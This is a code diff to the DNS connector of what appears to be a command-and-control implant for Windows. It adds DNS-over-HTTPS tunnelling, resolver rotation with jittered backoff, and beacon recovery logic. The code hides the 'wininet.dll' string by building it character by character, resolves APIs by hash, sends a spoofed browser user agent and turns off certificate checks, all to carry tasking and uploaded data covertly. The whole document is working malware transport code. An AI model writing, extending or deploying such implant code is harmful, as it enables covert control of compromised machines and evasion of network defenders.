@@ -3,6 +3,7 @@
 #include "Crypt.h"
 #include "utils.h"
 #include "ApiLoader.h"
+#include "ProcLoader.h"
 
 static inline void WriteBE32(BYTE* dst, ULONG val) {
     dst[0] = (BYTE)(val >> 24);
@@ -49,11 +50,20 @@ ConnectorDNS::ConnectorDNS()
     this->functions->gethostbyname = ApiWin->gethostbyname;
     this->functions->Sleep = ApiWin->Sleep;
     this->functions->GetTickCount = ApiWin->GetTickCount;
+    this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
+    this->functions->GetLastError = ApiWin->GetLastError;
+
+    // Initialize DoH functions structure
+    this->dohFunctions = (DOHFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DOHFUNC));
 }
 
 ConnectorDNS::~ConnectorDNS()
 {
     CloseConnector();
+    if (this->dohFunctions) {
+        this->functions->LocalFree(this->dohFunctions);
+        this->dohFunctions = NULL;
+    }
     if (this->functions) {
         this->functions->LocalFree(this->functions);
         this->functions = NULL;
@@ -105,6 +115,486 @@ void ConnectorDNS::CleanupWSA()
         this->functions->WSACleanup();
         this->wsaInitialized = FALSE;
     }
+}
+
+BOOL ConnectorDNS::InitDoH()
+{
+    if (this->dohInitialized)
+        return TRUE;
+
+    if (!this->functions || !this->functions->LoadLibraryA || !this->dohFunctions)
+        return FALSE;
+
+    // Load wininet.dll
+    CHAR wininet_c[12];
+    wininet_c[0]  = 'w';
+    wininet_c[1]  = 'i';
+    wininet_c[2]  = 'n';
+    wininet_c[3]  = 'i';
+    wininet_c[4]  = 'n';
+    wininet_c[5]  = 'e';
+    wininet_c[6]  = 't';
+    wininet_c[7]  = '.';
+    wininet_c[8]  = 'd';
+    wininet_c[9]  = 'l';
+    wininet_c[10] = 'l';
+    wininet_c[11] = 0;
+
+    HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
+    if (!hWininetModule)
+        return FALSE;
+
+    this->dohFunctions->InternetOpenA              = (decltype(InternetOpenA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
+    this->dohFunctions->InternetConnectA           = (decltype(InternetConnectA)*)          GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
+    this->dohFunctions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)          GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
+    this->dohFunctions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)          GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
+    this->dohFunctions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
+    this->dohFunctions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)      GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
+    this->dohFunctions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)            GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
+    this->dohFunctions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
+    this->dohFunctions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
+    this->dohFunctions->InternetReadFile           = (decltype(InternetReadFile)*)          GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
+
+    if (!this->dohFunctions->InternetOpenA || !this->dohFunctions->HttpSendRequestA)
+        return FALSE;
+
+    // Create Internet handle with user agent from profile
+    CHAR* userAgent = (CHAR*)this->profile.user_agent;
+    if (!userAgent || !userAgent[0]) {
+        // Default user agent if not configured (same as HTTP listener default)
+        static CHAR defaultUserAgent[] = "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0";
+        userAgent = defaultUserAgent;
+    }
+    this->hInternet = this->dohFunctions->InternetOpenA(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!this->hInternet)
+        return FALSE;
+
+    this->dohInitialized = TRUE;
+    return TRUE;
+}
+
+void ConnectorDNS::CleanupDoH()
+{
+    if (this->hInternet && this->dohFunctions && this->dohFunctions->InternetCloseHandle) {
+        this->dohFunctions->InternetCloseHandle(this->hInternet);
+        this->hInternet = NULL;
+    }
+    this->dohInitialized = FALSE;
+}
+
+void ConnectorDNS::ParseDohResolvers(const CHAR* dohResolvers)
+{
+    this->dohResolverCount = 0;
+    memset(this->dohResolverList, 0, sizeof(this->dohResolverList));
+    for (ULONG i = 0; i < kMaxResolvers; ++i) {
+        this->dohResolverFailCount[i] = 0;
+        this->dohResolverDisabledUntil[i] = 0;
+    }
+
+    if (!dohResolvers || !dohResolvers[0])
+        return;
+
+    // Copy to temporary buffer for parsing
+    CHAR tempBuf[1024];
+    StrLCopyA(tempBuf, dohResolvers, sizeof(tempBuf));
+
+    CHAR* p = tempBuf;
+    while (*p && this->dohResolverCount < kMaxResolvers) {
+        // Skip whitespace and separators
+        while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
+        if (!*p) break;
+
+        // Find end of URL
+        CHAR* urlStart = p;
+        while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
+        CHAR savedChar = *p;
+        if (*p) *p = '\0';
+
+        // Parse URL: https://host/path or https://host:port/path
+        DohResolverInfo* info = &this->dohResolverList[this->dohResolverCount];
+        info->port = 443;  // Default HTTPS port
+
+        CHAR* hostStart = urlStart;
+        // Skip "https://" prefix if present
+        if (hostStart[0] == 'h' && hostStart[1] == 't' && hostStart[2] == 't' && hostStart[3] == 'p') {
+            hostStart += 4;
+            if (*hostStart == 's') hostStart++;
+            if (hostStart[0] == ':' && hostStart[1] == '/' && hostStart[2] == '/') {
+                hostStart += 3;
+            }
+        }
+
+        // Find path separator
+        CHAR* pathStart = hostStart;
+        while (*pathStart && *pathStart != '/' && *pathStart != ':') ++pathStart;
+
+        // Check for port
+        if (*pathStart == ':') {
+            *pathStart = '\0';
+            StrLCopyA(info->host, hostStart, sizeof(info->host));
+            pathStart++;
+            info->port = 0;
+            while (*pathStart >= '0' && *pathStart <= '9') {
+                info->port = info->port * 10 + (*pathStart - '0');
+                pathStart++;
+            }
+            if (info->port == 0) info->port = 443;
+        } else {
+            CHAR savedPath = *pathStart;
+            *pathStart = '\0';
+            StrLCopyA(info->host, hostStart, sizeof(info->host));
+            *pathStart = savedPath;
+        }
+
+        // Copy path (default to /dns-query)
+        if (*pathStart == '/') {
+            StrLCopyA(info->path, pathStart, sizeof(info->path));
+        } else {
+            StrLCopyA(info->path, "/dns-query", sizeof(info->path));
+        }
+
+        if (info->host[0]) {
+            this->dohResolverCount++;
+        }
+
+        if (savedChar) {
+            *p = savedChar;
+            p++;
+        }
+    }
+
+    // Add default resolvers if none specified
+    if (this->dohResolverCount == 0) {
+        // Google
+        StrLCopyA(this->dohResolverList[0].host, "dns.google", sizeof(this->dohResolverList[0].host));
+        StrLCopyA(this->dohResolverList[0].path, "/dns-query", sizeof(this->dohResolverList[0].path));
+        this->dohResolverList[0].port = 443;
+        this->dohResolverCount = 1;
+    }
+}
+
+// Build DNS wire format query
+BOOL ConnectorDNS::BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outLen)
+{
+    if (!outBuf || outBufSize < 512 || !outLen)
+        return FALSE;
+
+    *outLen = 0;
+    memset(outBuf, 0, outBufSize);
+
+    // DNS header
+    USHORT id = (USHORT)(this->functions->GetTickCount() & 0xFFFF);
+    outBuf[0] = (BYTE)(id >> 8);
+    outBuf[1] = (BYTE)(id & 0xFF);
+    outBuf[2] = 0x01;  // RD flag
+    outBuf[3] = 0x00;
+    outBuf[4] = 0x00;
+    outBuf[5] = 0x01;  // QDCOUNT = 1
+
+    ULONG offset = 12;
+
+    // Encode query name
+    int nameLen = DnsCodec::EncodeName(qname, outBuf + offset, outBufSize - offset - 4);
+    if (nameLen < 0)
+        return FALSE;
+    offset += nameLen;
+
+    // Determine query type
+    USHORT qtypeCode = 16; // TXT default
+    if (qtypeStr && qtypeStr[0]) {
+        CHAR qt[8];
+        memset(qt, 0, sizeof(qt));
+        int qi = 0;
+        while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
+            CHAR c = qtypeStr[qi];
+            if (c >= 'a' && c <= 'z')
+                c = (CHAR)(c - 'a' + 'A');
+            qt[qi++] = c;
+        }
+        qt[qi] = '\0';
+        if (qt[0] == 'A' && qt[1] == '\0')
+            qtypeCode = 1;
+        else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0')
+            qtypeCode = 28;
+    }
+
+    outBuf[offset++] = (BYTE)(qtypeCode >> 8);
+    outBuf[offset++] = (BYTE)(qtypeCode & 0xFF);
+    outBuf[offset++] = 0x00;
+    outBuf[offset++] = 0x01;  // IN class
+
+    *outLen = offset;
+    return TRUE;
+}
+
+// Parse DNS wire format response (reuse logic from QuerySingle)
+BOOL ConnectorDNS::ParseDnsWireResponse(BYTE* response, ULONG respLen, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
+{
+    *outSize = 0;
+    if (!response || respLen <= 12 || !outBuf)
+        return FALSE;
+
+    // Determine expected query type
+    USHORT qtypeCode = 16; // TXT default
+    if (qtypeStr && qtypeStr[0]) {
+        CHAR qt[8];
+        memset(qt, 0, sizeof(qt));
+        int qi = 0;
+        while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
+            CHAR c = qtypeStr[qi];
+            if (c >= 'a' && c <= 'z')
+                c = (CHAR)(c - 'a' + 'A');
+            qt[qi++] = c;
+        }
+        qt[qi] = '\0';
+        if (qt[0] == 'A' && qt[1] == '\0')
+            qtypeCode = 1;
+        else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0')
+            qtypeCode = 28;
+    }
+
+    // Parse DNS response
+    int qdcount = (response[4] << 8) | response[5];
+    int ancount = (response[6] << 8) | response[7];
+    int pos = 12;
+
+    // Skip questions
+    for (int qi = 0; qi < qdcount; ++qi) {
+        while (pos < (int)respLen && response[pos] != 0) {
+            if ((response[pos] & 0xC0) == 0xC0) {
+                pos += 2;
+                break;
+            }
+            pos += response[pos] + 1;
+        }
+        pos++;
+        pos += 4;
+    }
+
+    // Parse answers
+    ULONG written = 0;
+    for (int ai = 0; ai < ancount; ++ai) {
+        if (pos + 12 > (int)respLen)
+            return FALSE;
+        if ((response[pos] & 0xC0) == 0xC0)
+            pos += 2;
+        else {
+            while (pos < (int)respLen && response[pos] != 0) {
+                pos += response[pos] + 1;
+            }
+            pos++;
+        }
+        USHORT type = (response[pos] << 8) | response[pos + 1];
+        pos += 2;
+        pos += 2; // class
+        pos += 4; // TTL
+        USHORT rdlen = (response[pos] << 8) | response[pos + 1];
+        pos += 2;
+        if (pos + rdlen > (int)respLen)
+            return FALSE;
+
+        if (qtypeCode == 16 && type == 16 && rdlen > 0) {
+            // TXT record
+            USHORT consumed = 0;
+            ULONG txtWritten = 0;
+            while (consumed < rdlen) {
+                if (pos + consumed >= (int)respLen)
+                    break;
+                BYTE txtLen = response[pos + consumed];
+                consumed++;
+                if (consumed + txtLen > rdlen)
+                    break;
+                if (txtLen > 0 && txtWritten + txtLen <= outBufSize) {
+                    memcpy(outBuf + txtWritten, response + pos + consumed, txtLen);
+                    txtWritten += txtLen;
+                }
+                consumed += txtLen;
+            }
+            if (txtWritten > 0) {
+                *outSize = txtWritten;
+                return TRUE;
+            }
+        }
+        else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
+            // A record
+            if (written + 4 <= outBufSize) {
+                memcpy(outBuf + written, response + pos, 4);
+                written += 4;
+            }
+        }
+        else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
+            // AAAA record
+            if (written + 16 <= outBufSize) {
+                memcpy(outBuf + written, response + pos, 16);
+                written += 16;
+            }
+        }
+        pos += rdlen;
+    }
+
+    if ((qtypeCode == 1 || qtypeCode == 28) && written > 0) {
+        *outSize = written;
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+// Single DoH query via HTTPS POST
+BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
+{
+    *outSize = 0;
+    if (!this->dohInitialized && !InitDoH())
+        return FALSE;
+
+    if (!resolver || !resolver->host[0] || !this->dohFunctions)
+        return FALSE;
+
+    // Build DNS wire format query
+    BYTE dnsQuery[512];
+    ULONG queryLen = 0;
+    if (!BuildDnsWireQuery(qname, qtypeStr, dnsQuery, sizeof(dnsQuery), &queryLen))
+        return FALSE;
+
+    // Connect to DoH server
+    HINTERNET hConnect = this->dohFunctions->InternetConnectA(
+        this->hInternet,
+        resolver->host,
+        resolver->port,
+        NULL, NULL,
+        INTERNET_SERVICE_HTTP,
+        0, 0
+    );
+    if (!hConnect)
+        return FALSE;
+
+    // Open POST request
+    CHAR acceptTypes[] = "application/dns-message";
+    LPCSTR rgpszAcceptTypes[] = { acceptTypes, NULL };
+    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | 
+                  INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_SECURE;
+
+    HINTERNET hRequest = this->dohFunctions->HttpOpenRequestA(
+        hConnect,
+        "POST",
+        resolver->path,
+        NULL, NULL,
+        rgpszAcceptTypes,
+        flags,
+        0
+    );
+    if (!hRequest) {
+        this->dohFunctions->InternetCloseHandle(hConnect);
+        return FALSE;
+    }
+
+    // Set security flags to ignore certificate errors (like in ConnectorHTTP)
+    DWORD dwFlags;
+    DWORD dwBuffer = sizeof(DWORD);
+    if (this->dohFunctions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer)) {
+        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
+        this->dohFunctions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+    }
+
+    // Set Content-Type header for DoH
+    CHAR headers[] = "Content-Type: application/dns-message\r\nAccept: application/dns-message\r\n";
+
+    // Send request with DNS query as body
+    BOOL sendOk = this->dohFunctions->HttpSendRequestA(
+        hRequest,
+        headers,
+        (DWORD)-1,
+        (LPVOID)dnsQuery,
+        queryLen
+    );
+
+    BOOL result = FALSE;
+    if (sendOk) {
+        // Check status code
+        CHAR statusCode[32];
+        DWORD statusCodeLen = sizeof(statusCode);
+        if (this->dohFunctions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLen, 0)) {
+            int status = 0;
+            for (int i = 0; statusCode[i] >= '0' && statusCode[i] <= '9'; i++) {
+                status = status * 10 + (statusCode[i] - '0');
+            }
+
+            if (status == 200) {
+                // Read response
+                BYTE respBuf[4096];
+                DWORD totalRead = 0;
+                DWORD bytesRead = 0;
+                DWORD bytesAvailable = 0;
+
+                while (this->dohFunctions->InternetQueryDataAvailable(hRequest, &bytesAvailable, 0, 0) && bytesAvailable > 0) {
+                    if (totalRead + bytesAvailable > sizeof(respBuf))
+                        bytesAvailable = sizeof(respBuf) - totalRead;
+                    if (bytesAvailable == 0)
+                        break;
+
+                    if (this->dohFunctions->InternetReadFile(hRequest, respBuf + totalRead, bytesAvailable, &bytesRead)) {
+                        totalRead += bytesRead;
+                        if (bytesRead == 0)
+                            break;
+                    } else {
+                        break;
+                    }
+                }
+
+                // Parse DNS response
+                if (totalRead > 12) {
+                    result = ParseDnsWireResponse(respBuf, totalRead, qtypeStr, outBuf, outBufSize, outSize);
+                }
+            }
+        }
+    }
+
+    this->dohFunctions->InternetCloseHandle(hRequest);
+    this->dohFunctions->InternetCloseHandle(hConnect);
+
+    return result;
+}
+
+BOOL ConnectorDNS::QueryDoHWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
+{
+    *outSize = 0;
+
+    if (this->dohResolverCount == 0)
+        return FALSE;
+
+    for (ULONG i = 0; i < this->dohResolverCount; ++i) {
+        ULONG idx = (this->currentDohResolverIndex + i) % this->dohResolverCount;
+        DohResolverInfo* resolver = &this->dohResolverList[idx];
+        if (!resolver->host[0]) continue;
+
+        ULONG nowTick = this->functions->GetTickCount();
+        if (this->dohResolverDisabledUntil[idx] && nowTick < this->dohResolverDisabledUntil[idx])
+            continue;
+
+        if (QueryDoH(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
+            this->currentDohResolverIndex = idx;
+            this->dohResolverFailCount[idx] = 0;
+            this->dohResolverDisabledUntil[idx] = 0;
+            return TRUE;
+        }
+
+        this->dohResolverFailCount[idx]++;
+
+        if (this->dohResolverFailCount[idx] >= kMaxFailCount) {
+            ULONG backoff = 30000;
+            if (this->sleepDelaySeconds > 0) {
+                ULONG b = this->sleepDelaySeconds * 2000;
+                if (b < 5000) b = 5000;
+                if (b > 30000) b = 30000;
+                backoff = b;
+            }
+            ULONG currentTick = this->functions->GetTickCount();
+            ULONG jitter = currentTick & 0x0FFF;
+            this->dohResolverDisabledUntil[idx] = currentTick + backoff + jitter;
+            this->dohResolverFailCount[idx] = 0;
+        }
+    }
+    return FALSE;
 }
 
 // Get socket (reuse cached or create new)
@@ -177,7 +667,7 @@ void ConnectorDNS::ParseResolvers(const CHAR* resolvers)
     }
 
     if (this->resolverCount == 0) {
-        StrLCopyA(this->rawResolvers, "1.1.1.1", sizeof(this->rawResolvers));
+        StrLCopyA(this->rawResolvers, "8.8.8.8", sizeof(this->rawResolvers));
         this->resolverList[0] = this->rawResolvers;
         this->resolverCount = 1;
     }
@@ -271,7 +761,7 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
     if (s == INVALID_SOCKET)
         return FALSE;
 
-    const CHAR* resolver = (resolverIP && resolverIP[0]) ? resolverIP : "1.1.1.1";
+    const CHAR* resolver = (resolverIP && resolverIP[0]) ? resolverIP : "8.8.8.8";
 
     HOSTENT* he = this->functions->gethostbyname(resolver);
     if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
@@ -466,6 +956,9 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULO
 
     ParseResolvers((CHAR*)profile.resolvers);
 
+    ParseDohResolvers((CHAR*)profile.doh_resolvers);
+    this->dnsMode = profile.dns_mode;
+
     if (!profile.encrypt_key)
         return FALSE;
     memset(this->encryptKey, 0, sizeof(this->encryptKey));
@@ -522,6 +1015,8 @@ void ConnectorDNS::CloseConnector()
     // Cleanup WSA and cached resources
     CleanupWSA();
 
+    CleanupDoH();
+
     if (this->recvData) {
         MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
         this->recvData = NULL;
@@ -565,7 +1060,7 @@ void ConnectorDNS::UpdateSleepDelay(ULONG sleepSeconds)
     this->sleepDelaySeconds = sleepSeconds;
 }
 
-BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
+BOOL ConnectorDNS::QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
 {
     *outSize = 0;
 
@@ -607,6 +1102,32 @@ BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BY
     return FALSE;
 }
 
+BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
+{
+    *outSize = 0;
+
+    switch (this->dnsMode) {
+        case DNS_MODE_UDP:
+            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+
+        case DNS_MODE_DOH:
+            return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+
+        case DNS_MODE_UDP_FALLBACK:
+            if (QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
+                return TRUE;
+            return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+
+        case DNS_MODE_DOH_FALLBACK:
+            if (QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
+                return TRUE;
+            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+
+        default:
+            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+    }
+}
+
 // Private helper: Send heartbeat (HB) request
 void ConnectorDNS::SendHeartbeat()
 {
@@ -627,6 +1148,7 @@ void ConnectorDNS::SendHeartbeat()
     ULONG ipSize = 0;
     if (QueryWithRotation(qnameA, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
         this->lastQueryOk = TRUE;
+        this->consecutiveFailures = 0;
 
         // Parse HB response: [flags:1][reserved:3]
         // Flags: 0x01 = has pending tasks, 0x02 = needs_reset
@@ -651,6 +1173,13 @@ void ConnectorDNS::SendHeartbeat()
     }
     else {
         this->lastQueryOk = FALSE;
+        this->consecutiveFailures++;
+        
+        if (this->consecutiveFailures >= 5) {
+            this->hasPendingTasks = FALSE;
+            this->downAckOffset = 0;
+            // Don't reset downBuf/downTotal - keep download state if in progress
+        }
     }
 }
 
@@ -756,8 +1285,10 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         BYTE tmp[512];
         ULONG tmpSize = 0;
         this->lastQueryOk = QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
-        if (this->lastQueryOk)
+        if (this->lastQueryOk) {
             this->hiSent = TRUE;
+            this->consecutiveFailures = 0;
+        }
         else if (this->hiRetries > 0)
             this->hiRetries--;
         return;
@@ -904,9 +1435,15 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         if (uploadComplete || offset >= total) {
             this->lastUpTotal = total;
             this->lastQueryOk = TRUE;
+            this->consecutiveFailures = 0;
         }
         else {
             this->lastQueryOk = FALSE;
+            this->consecutiveFailures++;
+            
+            if (this->consecutiveFailures >= 5) {
+                this->hasPendingTasks = FALSE;
+            }
         }
 
         // Send ACK if needed
@@ -915,8 +1452,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         return;
     }
 
-    // Handle HI retry
-    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
+    if (!this->hiSent && this->hiBeat && this->hiBeatSize) {
         memset(dataLabel, 0, sizeof(dataLabel));
         memset(qname, 0, sizeof(qname));
 
@@ -942,17 +1478,18 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         if (QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
             this->hiSent = TRUE;
             this->lastQueryOk = TRUE;
+            this->consecutiveFailures = 0;
         }
         else {
             this->lastQueryOk = FALSE;
-            if (this->hiRetries > 0)
-                this->hiRetries--;
+            this->consecutiveFailures++;
         }
         return;
     }
 
     // Send heartbeat if no pending download and no pending tasks
-    if (!this->forcePoll && !this->downBuf && !this->hasPendingTasks) {
+    // Also send heartbeat if connection was lost (consecutiveFailures > 0) to recover
+    if (!this->forcePoll && !this->downBuf && (!this->hasPendingTasks || this->consecutiveFailures > 0)) {
         SendHeartbeat();
         // If heartbeat indicates pending tasks, continue to API request
         if (!this->hasPendingTasks)
@@ -984,6 +1521,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     ULONG respSize = 0;
     if (QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
         this->lastQueryOk = TRUE;
+        this->consecutiveFailures = 0;
 
         // Check for "no data" response: "OK" or empty/small response
         if ((respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') ||
@@ -1129,6 +1667,16 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             return;
         memcpy(this->recvData, binBuf, binLen);
         this->recvSize = (int)binLen;
+    }
+    else {
+        // GET request failed - increment failure counter
+        this->lastQueryOk = FALSE;
+        this->consecutiveFailures++;
+        
+        if (this->consecutiveFailures >= 5) {
+            this->hasPendingTasks = FALSE;
+            this->downAckOffset = 0;
+        }
     }
 }
 
